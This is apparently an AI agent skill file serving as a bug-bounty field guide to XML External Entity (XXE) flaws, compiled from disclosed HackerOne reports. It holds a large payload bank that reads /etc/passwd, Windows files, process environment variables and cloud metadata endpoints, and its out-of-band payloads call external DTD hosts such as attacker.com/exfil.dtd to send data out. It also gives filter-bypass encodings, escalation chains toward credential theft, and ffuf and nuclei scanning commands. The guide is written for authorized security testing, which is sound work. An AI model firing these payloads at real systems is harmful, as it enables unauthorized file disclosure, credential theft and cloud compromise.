---
name: hackerone-xxe
description: >-
  Hunt XXE and XML parser flaws. Use when testing SOAP, SAML, SVG, DOCX/XLSX, and XML uploads. Backed by 64 disclosed HackerOne reports.
---

# XML External Entity (XXE) — HackerOne field guide

Built from **64** publicly disclosed HackerOne reports (2015–2026). Corpus: `~/.local/share/hackerone-reports/`.

## Signal

- Reports: **64** · paid: **11**
- Median bounty **$1,000** · p90 **$2,500** · max **$6,000** · total **$17,600**
- Median upvotes **24**

## Where it pays

| Program | Reports | Bounty | Upvotes |
|---|---|---|---|
| Mail.ru | 9 | $8,800 | 451 |
| Pornhub | 2 | $2,500 | 228 |
| Open-Xchange | 1 | $2,000 | 86 |
| GitHub Security Lab | 2 | $1,800 | 10 |
| Rockstar Games | 1 | $1,500 | 79 |
| Uber | 2 | $500 | 67 |
| VK.com | 1 | $500 | 18 |
| Informatica | 8 | $0 | 275 |

## Quick wins

Start here. These are the highest-yield tests for this class.

- Find XML parsers: SOAP, SAML, RSS, SVG, office docs, config imports.
- Test external entity file read and SSRF via SYSTEM identifiers.
- Try blind/OOB XXE with parameter entities and DNS callbacks.
- Test XInclude and error-based XXE when entities are blocked.
- Check SAML signature handling for XML signature wrapping.

## Payloads & probes

- `<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><x>&e;</x>`
- OOB -> `<!ENTITY % f SYSTEM "http://callback/%file;">`
- XInclude -> `<xi:include href="file:///etc/passwd" parse="text"/>`
- SVG -> `<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg>&xxe;</svg>`

## Payload bank

**23 curated payloads** in 5 context groups. Try them in order, stop at the first hit, then minimize. These are seeds, not a substitute for understanding the sink.

### Classic file read

```text
<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><x>&e;</x>
<?xml version="1.0"?><!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><x>&e;</x>
<!DOCTYPE x [<!ENTITY e SYSTEM "file:///c:/windows/win.ini">]><x>&e;</x>
<!DOCTYPE x [<!ENTITY e SYSTEM "file:///proc/self/environ">]><x>&e;</x>
<!DOCTYPE x [<!ENTITY e SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><x>&e;</x>
```

### Parameter entities / OOB

```text
<!DOCTYPE x [<!ENTITY % f SYSTEM "http://callback/%file;">%f;]>
<!DOCTYPE x [<!ENTITY % p SYSTEM "http://callback/evil.dtd">%p;]><x>&send;</x>
<!DOCTYPE x [<!ENTITY % a "<!ENTITY &#x25; b SYSTEM 'http://callback/%file;'>">%a;%b;]>
<!DOCTYPE x [<!ENTITY % remote SYSTEM "https://callback/evil.dtd">%remote;]>
```

### SSRF / cloud metadata

```text
<!DOCTYPE x [<!ENTITY e SYSTEM "http://169.254.169.254/latest/meta-data/">]><x>&e;</x>
<!DOCTYPE x [<!ENTITY e SYSTEM "http://metadata.google.internal/computeMetadata/v1/">]><x>&e;</x>
<!DOCTYPE x [<!ENTITY e SYSTEM "http://127.0.0.1:6379/">]><x>&e;</x>
<!DOCTYPE x [<!ENTITY e SYSTEM "http://callback/xxe">]><x>&e;</x>
```

### XInclude / SVG / Office

```text
<x xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd" parse="text"/></x>
<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg>&xxe;</svg>
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://callback/evil.dtd">%xxe;]><root/>
<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><soap:Envelope><soap:Body><x>&e;</x></soap:Body></soap:Envelope>
```

### Filter bypass

```text
<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><x>&e;</x>
<?xml version="1.0" encoding="UTF-7"?><!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><x>&e;</x>
<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd" >]><x>&e;</x>
<!DOCTYPE x [<!ENTITY e SYSTEM 'file:///etc/passwd'>]><x>&e;</x>
<!DOCTYPE x [<!ENTITY e PUBLIC "x" "file:///etc/passwd">]><x>&e;</x>
```

Copyable lists:
- `~/.local/share/hackerone-reports/wordlists/payloads_xxe.txt` (23)
- `~/.local/share/hackerone-reports/wordlists/payloads_xxe_waf.txt` (5 filter/WAF-focused)

## Bypass tricks

- Use UTF-16/UTF-7 encodings to bypass naive filters.
- Parameter entities and external DTDs when general entities are disabled.
- Error-based extraction when output is not reflected.

## Where to look

Parameters, endpoints, and fields that commonly carry this bug:

`xml` `soap` `saml` `svg` `docx` `xlsx` `import` `feed` `rss`

## Tools

`Burp` · `xxe-exploit` · `interactsh` · `nuclei`

## Escalation chains

- XXE -> file read -> creds.
- XXE -> SSRF -> metadata.
- SAML wrapping -> admin.

## Deeper checklist

- Find XML parsers: SOAP, SAML, RSS, SVG, office documents, config imports.
- Test external entity file read and SSRF via SYSTEM identifiers.
- Try blind/OOB XXE with parameter entities and DNS callbacks.
- Test XInclude and error-based XXE when direct entities are blocked.
- Check SAML signature handling for XML signature wrapping.
- Read a harmless file or trigger a callback as proof.

## Techniques from real reports

One concrete lesson per report (mined from the writeup), newest and most-upvoted first. Read 5–10 before testing.

- **XXE at ecjobs.starbucks.com.cn/retail/hxpublic_v6/hxdynamicpage6.aspx** — `#500515` · Starbucks · $0 · ▲319
  > POST /retail/hxpublic v6/hxdynamicpage6.aspx? hxpage=tempfiles/temp uploaded d4e4c8c5-c4ab-4743-a6fd-c2d779a29734.xml&max file size kb=1024&allow file type list=xml;jpg;jpeg;png;bmp;
- **XXE on sms-be-vip.twitter.com in SXMP Processor** — `#248668` · X / xAI · $0 · ▲258
  > In addition to local file read, it was confirmed through testing that if "file:///etc/passwd" is replaced with a URL, the servlet will make external requests and that it has outbound access to the internet.
- **XXE on https://duckduckgo.com** — `#483774` · DuckDuckGo · $0 · ▲218
  > An XML External Entity (XXE) injection vulnerability was discovered in the `x.js` endpoint on https://duckduckgo.com via `u` parameter.
- **Partial bypass of #483774 with Blind XXE on https://duckduckgo.com** — `#486732` · DuckDuckGo · $0 · ▲159
  > Blind XXE leads to `dos` and `blind injection`.
- **DMARC  Not found for paragonie.com   URGENT** — `#179828` · Paragon Initiative Enterprises · $0 · ▲147
  > "v=DMARC1;p=reject;pct=100;rua=mailto:postmaster@dmarcdomain.com"
- **XXE through injection of a payload in the XMP metadata of a JPEG file** — `#836877` · Informatica · $0 · ▲138
  > Specifically, the XXE attack is executed through the injection of a payload in the "XMP metadata" of the uploaded JPEG file.
- **XXE in Site Audit function exposing file and directory contents** — `#312543` · Semrush · $0 · ▲115
  > See the supporting materials below for an example of reading the `/etc/hostname` file and listing the contents of the `/home` directory.
- **XXE in DoD website that may lead to RCE** — `#227880` · U.S. Dept Of Defense · $0 · ▲97
  > An attacker can use an XML external entity vulnerability to send specially crafted unauthorized XML requests, which will be processed by the XML parser.
- **LFI and SSRF via XXE in emblem editor** — `#347139` · Rockstar Games · $1,500 · ▲79
  > By referencing a malicious external DTD in my hosted SVG file, I could extract text files, http responses, or even files from remote shares (again, using `//`).
- **Blind OOB XXE At "http://ubermovement.com/"** — `#154096` · Uber · $500 · ▲56
  > POST data was set to <?xml version="1.0" encoding="utf-8"? <!DOCTYPE dtgmlf6 [ <!ENTITY dtgmlf6ent SYSTEM "http://122.180.248.81/" ] <GeneralSearch &dtgmlf6ent;</GeneralSearch
- **RCE via Local File Read -> php unserialization-> XXE -> unpickling** — `#415501` · h1-5411-CTF · $0 · ▲46
  > template=../../../../../../../etc/passwd&type=text&top-text=ad&bottom-text=asd
- **[rev-app.informatica.com] - XXE** — `#105434` · Informatica · $0 · ▲45
  > <!DOCTYPE foo [ <!ELEMENT foo ANY <!ENTITY xxe PUBLIC "lol" "file:///etc/passwd" ]
- **xmlrpc.php &wp-cron.php files are enabled, and will used for (DDOS),(DOS) and broutforce users attack.** — `#2299069` · Nextcloud · $0 · ▲41
  > 3 to send alot of requests using xmlrpc.php https://nextcloud.com/wp-cron.php and if he wrote an python script to perform his attack with the header details , thes action can lead to stop wp-cron.php services .And he can make it using doser.go DOS attack tool…
- **Authenticated XXE** — `#1095645` · WordPress · $0 · ▲41
  > - trigger a Phar Deserialization by using the `phar://` stream wrapper within the XXE which can lead to further vulnerabilities, depending on the gadget chains available in the WordPress core and its plugins.
- **XXE on DoD web server** — `#188743` · U.S. Dept Of Defense · $0 · ▲38
  > dawgyg was able to exploit this vulnerability by crafting an XML request that revealed sensitive local system information.
- **[HTA2] XXE on https://███ via SpellCheck Endpoint.** — `#715949` · U.S. Dept Of Defense · $0 · ▲37
  > Log into `https://██████/` with the credentials `██████`
- **XML Parser Bug: XXE over which leads to RCE** — `#55431` · drchrono · $0 · ▲35
  > I was able to do XXE attack on your site and exposed the /etc/passwd file.
- **Singapore - XXE at https://www.starbucks.com.sg/RestApi/soap11** — `#762251` · Starbucks · $0 · ▲32
  > rugb discovered the endpoint at https://www.starbucks.com.sg/RestApi/ was found vulnerable to XML eXternal Entity (XXE) processing.
- **Reflected XSS and possible SSRF/XXE on https://events.hackerone.com/conferences/get_recording_slides_xml.xml?url=myserver/xss.xml** — `#1028396` · HackerOne · $0 · ▲32
  > events.hackerone.com was pointing towards a 3rd party vendor as a CNAME, I managed to find a full read SSRF and XXE vulnerability on an endpoint which belongs to the vendor via get recording slides xml.xml?url= endpoint that allowed me to achieve Reflected…
- **Non-production Open Database In Combination With XXE Leads To SSRF** — `#742808` · Evernote · $0 · ▲25
  > Access to the GCP project via the Google Cloud metadata endpoint which leads to access to at least the Google Cloud storage buckets and Google Cloud BigTable/BigQuery.
- **[app.informaticaondemand.com] XXE** — `#105753` · Informatica · $0 · ▲25
  > <!ENTITY % b PUBLIC "lol" "file:///etc/passwd"
- **XML External Entity (XXE) Injection** — `#2573567` · U.S. Dept Of Defense · $0 · ▲21
  > XML External Entity (XXE) injection vulnerability.
- **Uploaded XLF files result in External Entity Execution** — `#232614` · Weblate · $0 · ▲18
  > A minor modification shown in the steps below results in the /etc/passwd file out through the UI for review as a translation, although much worse things can be done - this is just to prove the vulnerability exists.
- **CCC H1 June 2021 CTF Writeup** — `#1217114` · h1-ctf · $0 · ▲16
  > Note that we tried various other recon techniques using the LFI including accessing local endpoints, trying to read source code, `/etc/passwd` etc., but these did not bear fruit, and in fact we found an `index.php` file containing a hash that rickrolled us :D
- **Flag WriteUp** — `#415202` · h1-5411-CTF · $0 · ▲15
  > Analyzing the requests I see that the `template` parameter value is a filename , so I try a path traversal with `../../../../../../../etc/passwd` and I get rick rolled :'( But changing the parameter `type` to `text` works !
- **XXE in the Connector Designer** — `#112116` · Bime · $0 · ▲15
  > A XML External Entity (XXE) vulnerability allowed an attacker to read arbitrary files on the server.
- **[marketplace.informatica.com] - XXE** — `#106797` · Informatica · $0 · ▲14
  > `<!ENTITY xxe SYSTEM "file:///etc/passwd1" ] `
- **[rev-app.informatica.com] - XXE via SAML** — `#106865` · Informatica · $0 · ▲12
  > `Referer: https://infapassport.okta.com/app/template saml/kwtbgh4jLAZPMXLQUNMU/sso/saml`
- **[usuppliers.uber.com] - Server Side Request Forgery via XXE OOB** — `#448598` · Uber · $0 · ▲11
  > It was possible to determine open internal ports on an usuppliers.uber.com server, via examination of different error messages to a specific POST request made with various payloads.
- **XXE with RCE potential on the https://█████████ (CVE-2017-3548)** — `#710654` · U.S. Dept Of Defense · $0 · ▲9
  > I determined that instance is available on localhost port 80, so it's possible to access `/pspc/services/AdminService` via XXE:

## Payload fragments observed

Recurring payloads from this class's writeups. Adapt, don't paste blindly.

| Seen | Fragment |
|---:|---|
| 4× | `Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.6,en;q=0.4` |
| 2× | `<!DOCTYPE svg [ / <!ENTITY % outside SYSTEM "http://attacker.com/exfil.dtd"> / %outside; / ]> / <svg> / <defs> / <pattern id="exploit"> / <t` |
| 2× | `<!ENTITY % data SYSTEM "file:///C:/Windows/system32/drivers/etc/hosts"> / <!ENTITY exfil "%data;">` |
| 2× | `%eval` |
| 2× | `Content-Type: application/xml;charset=UTF-8` |
| 2× | `<?xml version="1.0" encoding="UTF-8" standalone="no"?>` |
| 2× | `<!DOCTYPE foo [` |
| 2× | `<params>` |
| 2× | `<offset>0</offset>` |
| 2× | `<queryParams>` |
| 2× | `<query>&xxe;</query>` |
| 2× | `<sortBy>relevance</sortBy>` |
| 2× | `<fieldList>["id", "title"]</fieldList>` |
| 2× | `</queryParams>` |
| 2× | `<source>marketplace</source>` |
| 2× | `<rows>5</rows>` |
| 2× | `</params>` |
| 1× | `POST /edit-profile-avatar!uploadImage.jspa HTTP/1.1 / Host: ███████informatica.com / [...REDACTED...PLEASE.SEE.SCREENSHOTS.FOR.FULL.PAYLOAD]` |
| 1× | `███" - - [05/Feb/2018:13:12:26 +0000] "GET /text.txt HTTP/1.1" 302 - "-" "Java/1.8.0_144` |
| 1× | `46.229.173.66" - - [05/Feb/2018:14:26:02 +0000] "GET /resp/███████ HTTP/1.1" 302 - "-" "Mozilla/5.0 (compatible; SemrushBot-SA/0.97; +http:/` |

## Parameters observed

`debug` · `status` · `type` · `top-text` · `bottom-text` · `id` · `_hxpage` · `max_file_size_kb` · `allow_file_type_list` · `EventAction` · `EventDate` · `url` · `RelayState` · `method` · `dl`

## Case studies

### XXE at ecjobs.starbucks.com.cn/retail/hxpublic_v6/hxdynamicpage6.aspx
`#500515` · Starbucks · $0 · critical · 2019-11-13 · ▲319
> Description: Hi,guys,when i was visited the jobs of starbucks websites in China(https://ecjobs.starbucks.com.cn), i found a features of uploaded user's photo.Thought the bypass the security restrictions of upload,i can upload html|xhtml|xml|config files etc.The uploaded html file can realize the danger of stored xss,and the uploaded xml file can be parsed by the server,Through tested, the server does not prohibit the use of doctypes, entities, and access…

### XXE on sms-be-vip.twitter.com in SXMP Processor
`#248668` · X / xAI · $0 · medium · 2017-07-26 · ▲258
> I've identified an XXE vulnerability in the cloudhopper sxmp servlet on sms-be-vip.twitter.com which discloses local files to an external attacker and allows web requests to be sent. This aligns to https://www.owasp.org/index.php/XML External Entity (XXE) Processing

### XXE on https://duckduckgo.com
`#483774` · DuckDuckGo · $0 · critical · 2019-01-31 · ▲218
> An XML External Entity (XXE) injection vulnerability was discovered in the x.js endpoint on https://duckduckgo.com via u parameter. This was due to improper sanitation of external XML entities. The results was a leak of certain world readable files on the system. This issue was patched. Additionally, we intend to retire the endpoint in the very near future. Big thanks to @mik317 for reporting this issue!

### Partial bypass of #483774 with Blind XXE on https://duckduckgo.com
`#486732` · DuckDuckGo · $0 · high · 2019-02-25 · ▲159
> Summary: Hi DuckDuckGo team, I've contacted previously you because in a second time (on the 483774 report), I've seen that was possible bypass the fix. Anyway, I've not got any response, and because I think that this is a bit dangerous issue, I'm opening another report for the bypass. Hope you'll agree. Steps for reproduction: 1. Attacker creates a public server and hosts a file with the following content: 2.

### DMARC  Not found for paragonie.com   URGENT
`#179828` · Paragon Initiative Enterprises · $0 · critical · 2016-11-03 · ▲147
> Hi sir, , I am new hacker in hackerone platform I am glad to join paragonie bounty program ..i want to report a very critical bug that is i found DMARC missing for your domain paragonie.com Add DMARC record as soon as possible .. DMARC description Background Email authentication technologies SPF and DKIM were developed over a decade ago in order to provide greater assurance on the identity of the sender of a message.

## Wordlists

Mined from this class's writeups and ready for `ffuf`/`feroxbuster`. Paths and parameters recur across programs; verify each hit.

| File | Entries |
|---|---:|
| `~/.local/share/hackerone-reports/wordlists/paths_xxe.txt` | 74 |
| `~/.local/share/hackerone-reports/wordlists/params_xxe.txt` | 15 |
| `~/.local/share/hackerone-reports/wordlists/payloads_xxe.txt` | 23 |
| `~/.local/share/hackerone-reports/wordlists/payloads_xxe_waf.txt` | 5 |
| `~/.local/share/hackerone-reports/wordlists/paths.txt` (global) | 500 |
| `~/.local/share/hackerone-reports/wordlists/params.txt` (global) | 400 |

```sh
W=~/.local/share/hackerone-reports/wordlists
ffuf -u https://target/FUZZ -w $W/paths_xxe.txt \
     -mc all -fc 404 -fs 0 -rate 40
ffuf -u 'https://target/api?FUZZ=canary' -w $W/params_xxe.txt \
     -mr 'canary|error|invalid|not found' -rate 40
ffuf -u 'https://target/api?<param>=FUZZ' -w $W/payloads_xxe.txt \
     -mr '<hit-marker>' -rate 20
```

## Nuclei

Point at XML/SOAP/SAML/SVG/office upload endpoints.

```sh
nuclei -u https://target -tags xxe \
       -severity low,medium,high,critical -rl 40 -o nuclei_xxe.txt
nuclei -u https://target -t ~/nuclei-templates/dast/vulnerabilities/xxe -dast \
       -rl 40 -o nuclei_xxe_xxe.txt
nuclei -u https://target -t ~/nuclei-templates/http/vulnerabilities/generic \
       -rl 40 -o nuclei_xxe_generic.txt
# authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'
```

Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.

## Query the corpus

```sh
python3 ~/.local/share/hackerone-reports/h1.py search "<keyword>" --class xxe --limit 20
python3 ~/.local/share/hackerone-reports/h1.py stats --class xxe
python3 ~/.local/share/hackerone-reports/h1.py show <id> --full
```

Search by technology, endpoint, parameter, or program. Examples:

```sh
python3 ~/.local/share/hackerone-reports/h1.py search "wordpress" --class xxe
python3 ~/.local/share/hackerone-reports/h1.py search "reset token" --class xxe --min-bounty 1000
```

## Related

- `hackerone-ssrf` (337 reports)
- `hackerone-rce` (1,399 reports)
- `hackerone-deserialization` (93 reports)

## Reporting bar

- Prove real impact on a second controlled account or a safe callback.
- Keep the PoC minimal and reproducible; include raw requests and exact IDs.
- Stay inside program scope and follow disclosure rules.
